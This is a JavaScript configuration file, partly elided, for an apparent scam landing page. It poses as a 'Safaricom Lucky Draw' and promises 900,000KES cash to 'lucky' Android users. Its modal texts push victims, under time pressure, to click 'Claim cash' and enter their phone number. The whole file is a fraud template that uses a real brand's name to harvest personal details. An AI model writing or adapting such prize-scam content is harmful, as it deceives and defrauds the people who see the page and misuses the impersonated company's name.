...
var array_day = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
 ...
 // general
var win = '900,000KES cash'; // Prize
var win_brand = ''; // Prize
var win_box = 'ixs_box.png'; // Prize in box
var title = 'Find 900,000KES'; // Title
...
var b = "Safaricom Special commemorative Events, only today: <span class='date_day_number'></span>. <span class='date_month'></span>"; // subtitle
var d = "Dear user,"; // 
var e = "Every <span class = 'date_day_week'> </span> we select 6 lucky users who get the chance to win 900,000KES cash </span>."; //
...
// modal 1
var m_1_i = 'i11o.webp'; // Modal 1 image
var m_1_t = 'Safaricom Lucky Draw'; // Modal 1 title
var m_1_d = [{ // Modal 1 description
	"1": "Congratulations, Android user!",
	"2": "As a sponsored promotion, you can win <strong> 900,000KES</strong>.",
...
// modal 3
var m_3_i = 'i11o.webp'; // Modal 3 image
var m_3_t = 'Congratulations!'; // Modal 3 title
var m_3_s = '(1) <strong>900,000KES</strong> has been reserved '; // Modal 3 title
var m_3_d = [{ // Modal 3 description
	"1": "1. Click the button below.",
	"2": "2. Enter your phone number on the next page.",
	"3": "3. Your <strong>900,000KES</strong> will be recharged to your personal account"
}];
var m_3_b = 'Claim cash'; // Modal 3 button
